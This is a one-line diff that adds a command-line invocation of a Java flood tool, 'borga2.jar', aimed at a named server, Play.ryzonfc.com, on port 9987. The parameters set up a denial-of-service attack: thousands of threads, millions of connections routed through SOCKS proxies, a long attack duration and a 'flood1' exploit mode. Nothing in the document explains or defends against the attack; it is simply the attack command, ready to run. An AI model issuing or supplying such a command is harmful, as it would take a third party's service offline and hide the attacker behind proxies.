@@ -1,0 +1,1 @@
+java -jar borga2.jar host=Play.ryzonfc.com port=9987 srvResolve=false Resolve2=false alwaysResolve=false threads=15000 connections=5000000 multi=true removeFailure=true socksV4=true loopAmount=1900 timeout=0 keepAlive=true proxiesType=socks print=true proxiesFile=proxies.txt attackTime=600000 exploit=flood1
